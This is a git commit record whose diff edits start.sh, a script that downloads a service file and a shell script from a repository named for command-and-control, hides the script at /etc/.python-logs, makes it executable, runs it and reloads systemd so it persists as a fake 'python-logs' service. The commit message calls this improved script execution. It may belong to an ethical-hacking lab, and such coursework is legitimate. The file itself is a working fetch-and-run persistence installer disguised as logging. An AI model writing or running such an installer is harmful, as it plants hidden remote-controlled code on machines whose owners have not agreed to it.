f23690e1692c2bb22e122f58cd99b7332395034d
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-25 23:50:05 -0500

    Modify start.sh for improved script execution
    Updated curl command to use silent mode and added execution permission for the logs script.

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/python-logs.service
-curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
+curl -s https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/python-logs.service
+curl -s https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
 chmod +x /etc/.python-logs
 bash /etc/.python-logs
 systemctl daemon-reload
